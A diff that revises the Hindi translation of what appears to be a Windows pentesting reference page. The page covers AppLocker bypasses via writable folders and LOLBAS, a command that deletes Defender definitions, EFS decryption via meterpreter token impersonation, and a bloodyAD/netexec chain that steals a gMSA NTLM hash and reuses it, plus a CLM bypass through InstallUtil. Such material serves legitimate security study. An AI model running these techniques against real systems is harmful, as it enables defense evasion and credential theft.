@@ -4,14 +4,14 @@
 
 ## AppLocker नीति
 
-An application whitelist उन स्वीकृत software applications या executables की सूची होती है जिन्हें किसी सिस्टम पर मौजूद रहने और चलने की अनुमति होती है। इसका उद्देश्य environment को हानिकारक malware और उन अस्वीकृत software से सुरक्षित रखना है जो किसी organization की विशिष्ट व्यावसायिक आवश्यकताओं के अनुरूप नहीं होते।
+एक एप्लिकेशन व्हाइटलिस्ट उन अनुमोदित सॉफ़्टवेयर एप्लिकेशन या executable फाइलों की सूची है जिन्हें किसी सिस्टम पर मौजूद रहने और चलने की अनुमति होती है। इसका उद्देश्य संगठन की विशिष्ट व्यावसायिक आवश्यकताओं के अनुरूप न होने वाले हानिकारक malware और अनअनुमोदित सॉफ़्टवेयर से पर्यावरण की सुरक्षा करना है।
 
-[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) Microsoft का **application whitelisting solution** है और यह system administrators को यह नियंत्रित करने की अनुमति देता है कि **कौन-से applications और files users चला सकते हैं**। यह executables, scripts, Windows installer files, DLLs, packaged apps, and packed app installers पर **सूक्ष्म नियंत्रण (granular control)** प्रदान करता है।\
-संगठनों के लिए आम बात है कि वे **cmd.exe and PowerShell.exe** और कुछ निर्देशिकाओं पर write access को block कर देते हैं, **लेकिन यह सब bypass किया जा सकता है**।
+[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) Microsoft का **application whitelisting solution** है और सिस्टम एडमिनिस्ट्रेटरों को यह नियंत्रण देता है कि **किसे applications और files को users चला सकते हैं**। यह **सूक्ष्म नियंत्रण** प्रदान करता है executables, scripts, Windows installer files, DLLs, packaged apps, और packed app installers पर।\
+संगठनों के लिए आम है कि वे **cmd.exe और PowerShell.exe को ब्लॉक** कर दें और कुछ डायरेक्टरीज़ पर write access रोक दें, **पर इसे सभी बायपास किया जा सकता है**।
 
 ### जाँच
 
-Check which files/extensions are blacklisted/whitelisted:
+पता करें कि कौन सी फाइलें/एक्सटेंशन्स ब्लैकलिस्टेड/व्हाइटलिस्टेड हैं:
 ```bash
 Get-ApplockerPolicy -Effective -xml
 
@@ -20,60 +20,60 @@ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 $a = Get-ApplockerPolicy -effective
 $a.rulecollections
 ```
-यह रजिस्ट्री पथ AppLocker द्वारा लागू की गई कॉन्फ़िगरेशन और नीतियों को रखता है, और सिस्टम पर लागू नियमों के वर्तमान सेट की समीक्षा करने का एक तरीका प्रदान करता है:
+यह रजिस्ट्री पाथ AppLocker द्वारा लागू की गई कॉन्फ़िगरेशन और नीतियों को रखता है, जिससे सिस्टम पर लागू वर्तमान नियमों के सेट की समीक्षा करने का एक तरीका मिलता है:
 
 - `HKLM\Software\Policies\Microsoft\Windows\SrpV2`
 
-### Bypass
+### बायपास
 
-- AppLocker Policy को bypass करने के लिए उपयोगी **Writable folders**: यदि AppLocker `C:\Windows\System32` या `C:\Windows` के अंदर किसी भी चीज़ को execute करने की अनुमति दे रहा है, तो ऐसे **writable folders** हैं जिन्हें आप इसका **bypass** करने के लिए उपयोग कर सकते हैं।
+- AppLocker नीति को बायपास करने के लिए उपयोगी **लिखने योग्य फ़ोल्डर**: यदि AppLocker `C:\Windows\System32` या `C:\Windows` के अंदर किसी भी चीज़ को निष्पादित करने की अनुमति दे रहा है तो ऐसे **लिखने योग्य फ़ोल्डर** हैं जिनका आप उपयोग करके **इसे बायपास कर सकते हैं**।
 ```
 C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
 C:\Windows\System32\spool\drivers\color
 C:\Windows\Tasks
 C:\windows\tracing
 ```
-- आमतौर पर **विश्वसनीय** [**"LOLBAS's"**](https://lolbas-project.github.io/) बाइनरी AppLocker को बायपास करने में भी उपयोगी हो सकती हैं।
-- **खराब लिखे गए नियमों को भी बायपास किया जा सकता है**
-- उदाहरण के लिए, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, आप कहीं भी **`allowed` नामक फ़ोल्डर** बना सकते हैं और उसे अनुमति मिल जाएगी।
-- संगठन अक्सर **blocking the `%System32%\WindowsPowerShell\v1.0\powershell.exe` executable** पर ध्यान केंद्रित करते हैं, लेकिन **other** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) जैसे `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` या `PowerShell_ISE.exe` के बारे में भूल जाते हैं।
-- अतिरिक्त लोड और व्यापक परीक्षण की आवश्यकता के कारण **DLL enforcement very rarely enabled** होती है, इसलिए **DLLs as backdoors** AppLocker को बायपास करने में मदद करते हैं।
-- आप [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) या [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) का उपयोग करके किसी भी प्रक्रिया में **execute Powershell** कोड चला सकते हैं और AppLocker को बायपास कर सकते हैं। अधिक जानकारी के लिए देखें: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).
+- आम तौर पर **भरोसेमंद** [**"LOLBAS's"**](https://lolbas-project.github.io/) binaries AppLocker को बायपास करने में भी उपयोगी हो सकती हैं।
+- **खराब तरीके से लिखे गए नियमों को भी बायपास किया जा सकता है**
+- उदाहरण के लिए, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, आप कहीं भी **`allowed` नाम का एक फ़ोल्डर** बना सकते हैं और उसे अनुमति मिल जाएगी।
+- संगठन अक्सर **`%System32%\WindowsPowerShell\v1.0\powershell.exe` executable** को ब्लॉक करने पर ध्यान देते हैं, लेकिन अन्य [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) जैसे `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` या `PowerShell_ISE.exe` को भूल जाते हैं।
+- सिस्टम पर अतिरिक्त लोड और आवश्यक परीक्षण की मात्रा के कारण **DLL enforcement बहुत कम ही सक्षम किया जाता है**। इसलिए **DLLs को backdoors के रूप में उपयोग करना AppLocker को बायपास करने में मदद करेगा**।
+- आप [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) या [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) का उपयोग किसी भी प्रक्रिया में **Powershell** कोड execute करने और AppLocker को बायपास करने के लिए कर सकते हैं। अधिक जानकारी के लिए देखें: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).
 
-## क्रेडेंशियल्स स्टोरेज
+## Credentials Storage
 
 ### Security Accounts Manager (SAM)
 
-स्थानीय क्रेडेंशियल्स इस फ़ाइल में मौजूद होते हैं; पासवर्ड हैश किए गए होते हैं।
+स्थानीय क्रेडेंशियल्स इस फ़ाइल में मौजूद होते हैं, पासवर्ड हैश किए जाते हैं।
 
 ### Local Security Authority (LSA) - LSASS
 
-Single Sign-On कारणों से **क्रेडेंशियल्स** (hashed) इस सबसिस्टम की **मेमोरी** में **सहेजे** जाते हैं।\
-LSA स्थानीय **security policy** (password policy, users permissions...), **authentication**, **access tokens** आदि का प्रबंधन करती है।\
-LSA वही घटक होगा जो लोकल लॉगिन के लिए दिए गए क्रेडेंशियल्स को **SAM** फ़ाइल के अंदर **चेक** करेगा और डोमेन उपयोगकर्ता को प्रमाणीकृत करने के लिए **domain controller** से **बात** करेगा।
+Single Sign-On कारणों से ये **credentials** (hashed) इस सबसिस्टम की **memory** में **सहेजे** जाते हैं।\
+**LSA** स्थानीय **security policy** (पासवर्ड पॉलिसी, उपयोगकर्ता अनुमतियाँ...), **authentication**, **access tokens** आदि का प्रबंधन करता है।\
+LSA वही घटक होगा जो स्थानीय लॉगिन के लिए **SAM** फ़ाइल के अंदर प्रदत्त क्रेडेंशियल्स की **जांच** करेगा और डोमेन उपयोगकर्ता को प्रमाणित करने के लिए **domain controller** से **बात** करेगा।
 
-**क्रेडेंशियल्स** प्रक्रिया **LSASS** के अंदर सहेजे जाते हैं: Kerberos tickets, NT और LM hashes, आसानी से डिक्रिप्ट किए जा सकने वाले पासवर्ड।
+ये **credentials** प्रक्रिया LSASS के अंदर सहेजे जाते हैं: Kerberos tickets, NT और LM हैशेस, आसानी से डीक्रिप्ट किए जा सकने वाले पासवर्ड।
 
 ### LSA secrets
 
 LSA डिस्क पर कुछ क्रेडेंशियल्स सहेज सकता है:
 
-- Active Directory के कंप्यूटर अकाउंट का पासवर्ड (unreachable domain controller).
-- Windows services के खातों के पासवर्ड
-- scheduled tasks के लिए पासवर्ड
-- और अधिक (IIS applications का पासवर्ड...)
+- Active Directory के कंप्यूटर अकाउंट का पासवर्ड (यदि domain controller पहुँच योग्य न हो)।
+- Windows सेवाओं के खातों के पासवर्ड
+- शेड्यूल्ड टास्क्स के लिए पासवर्ड
+- और भी (IIS applications का पासवर्ड...)
 
 ### NTDS.dit
 
-यह Active Directory का डेटाबेस है। यह केवल Domain Controllers में मौजूद होता है।
+यह Active Directory का डेटाबेस है। यह केवल Domain Controllers पर मौजूद होता है।
 
 ## Defender
 
-[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) एक Antivirus है जो Windows 10 और Windows 11 में तथा Windows Server के संस्करणों में उपलब्ध है। यह सामान्य pentesting टूल्स जैसे **`WinPEAS`** को **ब्लॉक** कर सकता है। हालाँकि, इन सुरक्षा उपायों को **बायपास** करने के तरीके मौजूद हैं।
+[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) एक Antivirus है जो Windows 10 और Windows 11 तथा Windows Server के संस्करणों में उपलब्ध है। यह सामान्य pentesting टूल्स जैसे **`WinPEAS`** को **ब्लॉक** करता है। हालांकि, इन सुरक्षा उपायों को **बायपास** करने के तरीके मौजूद हैं।
 
-### जाँच
+### Check
 
-Defender की **स्थिति** जांचने के लिए आप PS cmdlet **`Get-MpComputerStatus`** चला सकते हैं (सक्रिय है या नहीं जानने के लिए **`RealTimeProtectionEnabled`** का मान देखें):
+Defender की **स्थिति** जांचने के लिए आप PS cmdlet **`Get-MpComputerStatus`** चला सकते हैं (जानने के लिए कि यह सक्रिय है या नहीं, **`RealTimeProtectionEnabled`** के मान की जांच करें):
 
 <pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus
 
@@ -92,7 +92,7 @@ NISEngineVersion                : 0.0.0.0
 PSComputerName                  :
 </code></pre>
 
-इसे सूचीबद्ध करने के लिए आप यह भी चला सकते हैं:
+इसे एनेमरेट करने के लिए आप निम्न भी चला सकते हैं:
 ```bash
 WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
 wmic /namespace:\\root\securitycenter2 path antivirusproduct
@@ -101,36 +101,36 @@ sc query windefend
 #Delete all rules of Defender (useful for machines without internet access)
 "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
 ```
-## Encrypted File System (EFS)
+## एन्क्रिप्टेड फ़ाइल सिस्टम (EFS)
 
-EFS फाइलों को एन्क्रिप्शन के माध्यम से सुरक्षित करता है, और इसके लिए एक **symmetric key** जिसका नाम **File Encryption Key (FEK)** है का उपयोग करता है। यह key उपयोगकर्ता की **public key** से एन्क्रिप्ट होकर एन्क्रिप्टेड फ़ाइल के $EFS **alternative data stream** में स्टोर होता है। जब डिक्रिप्शन की आवश्यकता होती है, तो उपयोगकर्ता के डिजिटल सर्टिफिकेट की संबंधित **private key** का उपयोग $EFS stream से FEK को डिक्रिप्ट करने के लिए किया जाता है। More details can be found [here](https://en.wikipedia.org/wiki/Encrypting_File_System).
+EFS फ़ाइलों को एन्क्रिप्शन के माध्यम से सुरक्षित करता है, एक **symmetric key** जिसका नाम **File Encryption Key (FEK)** है, का उपयोग करके। यह कुंजी उपयोगकर्ता की **public key** से एन्क्रिप्ट की जाती है और एन्क्रिप्ट की गई फ़ाइल के $EFS **alternative data stream** में संग्रहित रहती है। जब डिक्रिप्शन की आवश्यकता होती है, तो उपयोगकर्ता के डिजिटल सर्टिफिकेट की संबंधित **private key** का उपयोग $EFS stream से FEK को डिक्रिप्ट करने के लिए किया जाता है। More details can be found [here](https://en.wikipedia.org/wiki/Encrypting_File_System).
 
-**Decryption scenarios without user initiation** में निम्न शामिल हैं:
+**Decryption scenarios without user initiation** include:
 
-- जब फाइलें या फ़ोल्डर किसी non-EFS file system, जैसे [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), पर मूव किए जाते हैं तो वे स्वतः डिक्रिप्ट हो जाते हैं।
-- SMB/CIFS प्रोटोकॉल के ज़रिये नेटवर्क पर भेजी जाने वाली एन्क्रिप्टेड फाइलें ट्रांसमिशन से पहले डिक्रिप्ट कर दी जाती हैं।
+- जब फ़ाइलें या फ़ोल्डर non-EFS file system, जैसे [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), पर स्थानांतरित किए जाते हैं तो उन्हें स्वचालित रूप से डिक्रिप्ट कर दिया जाता है।
+- SMB/CIFS protocol के माध्यम से नेटवर्क पर भेजी जाने वाली एन्क्रिप्ट की गई फ़ाइलें प्रसारण से पहले डिक्रिप्ट कर दी जाती हैं।
 
-यह एन्क्रिप्शन तरीका मालिक को एन्क्रिप्टेड फाइलों तक **transparent access** प्रदान करता है। हालांकि, केवल मालिक का पासवर्ड बदलकर और लॉगिन करके डिक्रिप्शन संभव नहीं होगा।
+यह एन्क्रिप्शन तरीका मालिक को एन्क्रिप्ट की गई फ़ाइलों के लिए **transparent access** प्रदान करता है। हालांकि, केवल मालिक का पासवर्ड बदलने और लॉगिन करने से डिक्रिप्शन संभव नहीं होगा।
 
 **Key Takeaways**:
 
-- EFS एक symmetric FEK का उपयोग करता है, जिसे उपयोगकर्ता की public key से एन्क्रिप्ट किया जाता है।
+- EFS एक symmetric FEK का उपयोग करता है, जो उपयोगकर्ता की public key से एन्क्रिप्ट किया जाता है।
 - डिक्रिप्शन के लिए उपयोगकर्ता की private key का उपयोग FEK तक पहुँचने के लिए किया जाता है।
-- कुछ परिस्थितियों में ऑटोमैटिक डिक्रिप्शन हो सकता है, जैसे FAT32 पर कॉपी करना या नेटवर्क ट्रांसमिशन।
-- एन्क्रिप्टेड फाइलें मालिक के लिए बिना अतिरिक्त कदम के एक्सेसेबल रहती हैं।
+- स्वचालित डिक्रिप्शन कुछ विशिष्ट परिस्थितियों में होता है, जैसे FAT32 पर कॉपी करना या नेटवर्क के माध्यम से ट्रांसमिशन।
+- एन्क्रिप्ट की गई फ़ाइलें मालिक द्वारा अतिरिक्त कदम के बिना एक्सेस की जा सकती हैं।
 
-### Check EFS info
+### EFS जानकारी जाँचें
 
-जांचें कि किसी **user** ने इस **service** का उपयोग किया है या नहीं, यह देखने के लिए चेक करें कि यह path मौजूद है:`C:\users\<username>\appdata\roaming\Microsoft\Protect`
+जाँच करें कि कोई **user** ने इस **service** को **used** किया है या नहीं — यह देखने के लिए कि यह path मौजूद है:`C:\users\<username>\appdata\roaming\Microsoft\Protect`
 
-यह देखना कि फ़ाइल तक **कौन** की **access** है, `cipher /c \<file\>` का उपयोग करें\
-आप `cipher /e` और `cipher /d` को किसी फ़ोल्डर के अंदर उपयोग करके सभी फाइलों को **encrypt** और **decrypt** भी कर सकते हैं
+फ़ाइल पर किसे **access** है यह जाँचने के लिए cipher /c \<file\> का उपयोग करें\
+आप किसी फ़ोल्डर के अंदर `cipher /e` और `cipher /d` का उपयोग करके सभी फ़ाइलों को **encrypt** और **decrypt** कर सकते हैं
 
-### Decrypting EFS files
+### EFS फ़ाइलों को डिक्रिप्ट करना
 
 #### Being Authority System
 
-इस तरीके के लिए आवश्यक है कि **victim user** होस्ट के अंदर कोई **process** **running** कर रहा हो। अगर ऐसा है, तो `meterpreter` sessions का उपयोग करके आप उस यूज़र के प्रोसेस के टोकन को impersonate कर सकते हैं (`impersonate_token` from `incognito`)। या आप सीधे उस यूज़र के process में `migrate` भी कर सकते हैं।
+यह तरीका यह माँगता है कि **victim user** होस्ट के अंदर एक **process** चला रहा हो। यदि ऐसा है, तो `meterpreter` sessions का उपयोग करके आप उपयोगकर्ता के process के token की impersonation कर सकते हैं (`impersonate_token` from `incognito`). या आप बस उपयोगकर्ता के process में `migrate` कर सकते हैं।
 
 #### Knowing the users password
 
@@ -139,65 +139,66 @@ EFS फाइलों को एन्क्रिप्शन के माध
 https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
 {{#endref}}
 
-## Group Managed Service Accounts (gMSA)
+## समूह प्रबंधित सेवा खाते (gMSA)
 
-Microsoft ने IT इंफ्रास्ट्रक्चर में service accounts के प्रबंधन को आसान बनाने के लिए **Group Managed Service Accounts (gMSA)** विकसित किए। पारंपरिक service accounts के विपरीत जिनमें अक्सर "**Password never expire**" सेटिंग सक्षम होती है, gMSA एक अधिक सुरक्षित और प्रबंधनीय समाधान प्रदान करते हैं:
+Microsoft ने IT इन्फ्रास्ट्रक्चर में service accounts के प्रबंधन को सरल बनाने के लिए **Group Managed Service Accounts (gMSA)** विकसित किए। पारंपरिक service accounts के विपरीत जिनमें अक्सर 'Password never expire' सेटिंग सक्षम होती है, gMSAs अधिक सुरक्षित और प्रबंधनीय समाधान प्रदान करते हैं:
 
-- **Automatic Password Management**: gMSA एक जटिल, 240-character password का उपयोग करते हैं जो domain या computer policy के अनुसार स्वचालित रूप से बदलता है। यह प्रक्रिया Microsoft's Key Distribution Service (KDC) द्वारा संभाली जाती है, जिससे मैन्युअल पासवर्ड अपडेट की आवश्यकता खत्म हो जाती है।
-- **Enhanced Security**: ये खाते lockouts के प्रति इम्यून होते हैं और interactive logins के लिए उपयोग नहीं किए जा सकते, जिससे उनकी सुरक्षा बढ़ती है।
-- **Multiple Host Support**: gMSA कई होस्टों के बीच साझा किए जा सकते हैं, जिससे ये उन सेवाओं के लिए आदर्श हैं जो कई सर्वरों पर चलती हैं।
-- **Scheduled Task Capability**: managed service accounts के विपरीत, gMSA scheduled tasks चलाने का समर्थन करते हैं।
-- **Simplified SPN Management**: जब कंप्यूटर के sAMaccount विवरण या DNS नाम में परिवर्तन होता है तो सिस्टम स्वचालित रूप से Service Principal Name (SPN) को अपडेट करता है, जिससे SPN प्रबंधन सरल हो जाता है।
+- **Automatic Password Management**: gMSAs एक जटिल, 240-character password का उपयोग करते हैं जो domain या computer policy के अनुसार स्वचालित रूप से बदलता रहता है। यह प्रक्रिया Microsoft's Key Distribution Service (KDC) द्वारा संभाली जाती है, जिससे मैन्युअल पासवर्ड अपडेट की आवश्यकता खत्म हो जाती है।
+- **Enhanced Security**: ये खाते lockouts के प्रति immune होते हैं और interactive logins के लिए उपयोग नहीं किए जा सकते, जिससे उनकी सुरक्षा बढ़ती है।
+- **Multiple Host Support**: gMSAs कई hosts पर साझा किए जा सकते हैं, जिससे वे कई सर्वरों पर चलने वाली सेवाओं के लिए उपयुक्त होते हैं।
+- **Scheduled Task Capability**: managed service accounts के विपरीत, gMSAs scheduled tasks चलाने का समर्थन करते हैं।
+- **Simplified SPN Management**: जब कंप्यूटर के sAMaccount विवरण या DNS नाम में परिवर्तन होता है, तो सिस्टम स्वचालित रूप से Service Principal Name (SPN) को अपडेट करता है, जिससे SPN प्रबंधन सरल हो जाता है।
 
-gMSA के पासवर्ड LDAP प्रॉपर्टी _**msDS-ManagedPassword**_ में स्टोर होते हैं और इन्हें Domain Controllers (DCs) द्वारा हर 30 दिनों में ऑटोमैटिक रीसेट किया जाता है। यह पासवर्ड, एक एन्क्रिप्टेड डेटा ब्लॉब जिसे [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) कहा जाता है, केवल अधिकृत administrators और जिन सर्वरों पर gMSA इंस्टॉल हैं उन सर्वरों द्वारा ही प्राप्त किया जा सकता है, जिससे एक सुरक्षित वातावरण सुनिश्चित होता है। इस जानकारी तक पहुँचने के लिए एक सुरक्षित कनेक्शन जैसे LDAPS आवश्यक है, या कनेक्शन को 'Sealing & Secure' के साथ authenticated होना चाहिए।
+gMSA के पासवर्ड LDAP property _**msDS-ManagedPassword**_ में संग्रहीत होते हैं और Domain Controllers (DCs) द्वारा प्रत्येक 30 दिनों में स्वचालित रूप से रीसेट किए जाते हैं। यह पासवर्ड, एक एन्क्रिप्टेड डेटा ब्लॉब जिसे [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) कहा जाता है, केवल अधिकृत administrators और उन सर्वरों द्वारा ही पुनःप्राप्त किया जा सकता है जिन पर gMSAs इंस्टॉल हैं, जिससे एक सुरक्षित वातावरण सुनिश्चित होता है। इस जानकारी तक पहुँचने के लिए, LDAPS जैसी एक सुरक्षित कनेक्शन आवश्यक है, या कनेक्शन को 'Sealing & Secure' के साथ प्रमाणित किया जाना चाहिए।
 
 ![https://cube0x0.github.io/Relaying-for-gMSA/](../../images/asd1.png)
 
-You can read this password with [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
+आप इस पासवर्ड को पढ़ने के लिए [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader) का उपयोग कर सकते हैं:**
 ```
 /GMSAPasswordReader --AccountName jkohler
 ```
 [**Find more info in this post**](https://cube0x0.github.io/Relaying-for-gMSA/)
 
-Also, check this [web page](https://cube0x0.github.io/Relaying-for-gMSA/) about how to perform a **NTLM relay attack** to **read** the **password** of **gMSA**.
+इसके अलावा, इस [web page](https://cube0x0.github.io/Relaying-for-gMSA/) को देखें जो बताती है कि कैसे **NTLM relay attack** करके **gMSA** का **password** पढ़ा जा सकता है।
 
-### ACL chaining का दुरुपयोग कर के gMSA managed password पढ़ना (GenericAll -> ReadGMSAPassword)
+### ACL chaining का दुरुपयोग करके gMSA प्रबंधित पासवर्ड पढ़ना (GenericAll -> ReadGMSAPassword)
 
-कई वातावरणों में, कम-privileged उपयोगकर्ता misconfigured object ACLs का दुरुपयोग करके बिना DC compromise किये gMSA secrets तक पहुँच (pivot) कर सकते हैं:
+कई वातावरणों में, कम-प्रिविलेज उपयोगकर्ता misconfigured object ACLs का दुरुपयोग करके DC compromise किए बिना gMSA secrets तक पहुंच बना सकते हैं:
 
-- ऐसी group जिसे आप नियंत्रित कर सकते हैं (उदा., GenericAll/GenericWrite के माध्यम से) को gMSA पर `ReadGMSAPassword` दिया गया होता है।
-- उस group में खुद को जोड़कर, आप LDAP के माध्यम से gMSA के `msDS-ManagedPassword` blob को पढ़ने का अधिकार प्राप्त कर लेते हैं और उपयोगी NTLM credentials निकाल सकते हैं।
+- एक ऐसा group जिसे आप नियंत्रित कर सकते हैं (उदाहरण के लिए, GenericAll/GenericWrite के माध्यम से) को gMSA पर `ReadGMSAPassword` दिया गया है।
+- अपने आप को उस group में जोड़कर, आप LDAP के माध्यम से gMSA का `msDS-ManagedPassword` blob पढ़ने का अधिकार विरासत में पाते हैं और उपयोगी NTLM credentials निकाल सकते हैं।
 
-सामान्य workflow:
+सामान्य कार्यप्रवाह:
 
-1) BloodHound से path खोजें और अपने foothold principals को Owned के रूप में मार्क करें। ऐसे edges देखें:
+1) BloodHound के साथ path ढूंढें और अपने foothold principals को Owned के रूप में चिह्नित करें। निम्नलिखित तरह के edges देखें:
 - GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA
 
-2) उस intermediate group में खुद को जोड़ें जिसे आप नियंत्रित करते हैं (उदाहरण bloodyAD के साथ):
+2) जिस intermediate group को आप नियंत्रित करते हैं उसमें स्वयं को जोड़ें (उदाहरण bloodyAD के साथ):
 ```bash
 bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
 ```
-3) LDAP के माध्यम से gMSA managed password पढ़ें और NTLM hash निकालें। NetExec `msDS-ManagedPassword` के extraction और NTLM में conversion को automate करता है:
+3) LDAP के माध्यम से gMSA मैनेज्ड पासवर्ड पढ़ें और NTLM हैश प्राप्त करें। NetExec `msDS-ManagedPassword` का निष्कर्षण और NTLM में रूपांतरण स्वचालित करता है:
 ```bash
 # Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
 netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
 # Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
 ```
-4) gMSA के रूप में NTLM hash का उपयोग करके Authenticate करें (किसी plaintext की आवश्यकता नहीं है)। यदि खाता Remote Management Users में है, तो WinRM सीधे काम करेगा:
+4) gMSA के रूप में NTLM hash का उपयोग करके Authenticate करें (कोई plaintext आवश्यक नहीं)। यदि खाता Remote Management Users में है, तो WinRM सीधे काम करेगा:
 ```bash
 # SMB / WinRM as the gMSA using the NT hash
 netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
 netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
 ```
 नोट:
-- `msDS-ManagedPassword` के LDAP पढ़ने के लिए sealing की आवश्यकता होती है (उदा., LDAPS/sign+seal)। Tools इसे स्वचालित रूप से संभालते हैं।
-- gMSAs को अक्सर WinRM जैसे स्थानीय अधिकार दिए जाते हैं; lateral movement की योजना बनाने के लिए group membership (उदा., Remote Management Users) की पुष्टि करें।
-- यदि आपको केवल blob की आवश्यकता है ताकि आप स्वयं NTLM निकाल सकें, तो MSDS-MANAGEDPASSWORD_BLOB structure देखें।
+- `msDS-ManagedPassword` की LDAP रीड्स के लिए sealing की आवश्यकता होती है (उदा., LDAPS/sign+seal)। टूल्स इसे स्वचालित रूप से संभाल लेते हैं।
+- gMSAs को अक्सर WinRM जैसे लोकल अधिकार दिए जाते हैं; lateral movement की योजना बनाने के लिए group membership (उदा., Remote Management Users) सत्यापित करें।
+- यदि आपको सिर्फ blob की आवश्यकता है ताकि आप स्वयं NTLM की गणना कर सकें, तो MSDS-MANAGEDPASSWORD_BLOB structure देखें。
+
 
 
 ## LAPS
 
-The **Local Administrator Password Solution (LAPS)**, available for download from [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), स्थानीय Administrator पासवर्ड के प्रबंधन को सक्षम करता है। ये पासवर्ड, जो **यादृच्छिक**, अद्वितीय, और **नियमित रूप से बदले जाते हैं**, Active Directory में केंद्रीकृत रूप से संग्रहित होते हैं। इन पासवर्ड्स तक पहुँच ACLs के माध्यम से अधिकृत उपयोगकर्ताओं तक सीमित है। पर्याप्त अनुमतियाँ मिलने पर, स्थानीय admin पासवर्ड पढ़ने की क्षमता प्राप्त हो सकती है।
+The **Local Administrator Password Solution (LAPS)**, जिसे [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899) से डाउनलोड किया जा सकता है, स्थानीय Administrator पासवर्ड्स के प्रबंधन की सुविधा देता है। ये पासवर्ड्स, जो **randomized**, unique, और **regularly changed** होते हैं, केंद्रीय रूप से Active Directory में संग्रहीत होते हैं। इन पासवर्ड्स तक पहुँच ACLs के माध्यम से अधिकृत उपयोगकर्ताओं तक सीमित रहती है। पर्याप्त अनुमतियाँ दिए जाने पर स्थानीय admin पासवर्ड पढ़ने की क्षमता प्राप्त हो जाती है।
 
 
 {{#ref}}
@@ -206,9 +207,9 @@ The **Local Administrator Password Solution (LAPS)**, available for download fro
 
 ## PS Constrained Language Mode
 
-PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) PowerShell को प्रभावी ढंग से उपयोग करने के लिए आवश्यक कई सुविधाओं को **प्रतिबंधित कर देता है**, जैसे कि COM objects को ब्लॉक करना, केवल अनुमोदित .NET types को अनुमति देना, XAML-based workflows, PowerShell classes, और अधिक।
+PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **कई उन सुविधाओं को लॉक कर देता है** जो PowerShell को प्रभावी ढंग से उपयोग करने के लिए आवश्यक हैं, जैसे कि COM objects को ब्लॉक करना, केवल अनुमोदित .NET types की अनुमति देना, XAML-आधारित workflows, PowerShell classes, और अन्य।
 
-### **जाँचें**
+### **जांचें**
 ```bash
 $ExecutionContext.SessionState.LanguageMode
 #Values could be: FullLanguage or ConstrainedLanguage
@@ -219,9 +220,9 @@ $ExecutionContext.SessionState.LanguageMode
 Powershell -version 2
 ```
 वर्तमान Windows में वह Bypass काम नहीं करेगा लेकिन आप[ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
-**इसे कम्पाइल करने के लिए आपको आवश्यकता पड़ सकती है** **कि** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> जोड़ें `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` और **परियोजना को .Net4.5 में बदलें**।
+**इसे कंपाइल करने के लिए आपको संभवतः आवश्यकता हो सकती है** **करने के लिए** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> add `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` and **प्रोजेक्ट को .Net4.5 में बदलें**।
 
-#### प्रत्यक्ष bypass:
+#### सीधा bypass:
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
 ```
